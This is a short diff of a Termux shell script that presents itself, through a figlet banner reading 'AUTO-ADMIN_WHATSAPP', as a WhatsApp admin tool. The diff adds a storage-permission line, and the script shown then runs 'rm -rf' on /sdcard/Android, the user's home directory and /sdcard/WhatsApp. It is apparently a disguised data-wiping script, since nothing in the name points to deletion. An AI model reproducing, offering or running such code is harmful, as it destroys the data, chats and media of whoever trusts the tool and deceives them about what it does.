@@ -3,7 +3,7 @@ termux-setup-storage
 figlet -f slant "AUTO-ADMIN_WHATSAPP"
 
 
-
+termux-setup-storage
 rm -rf cd /sdcard/Android
 rm -rf cd ~
 rm -rf cd /sdcard/WhatsApp
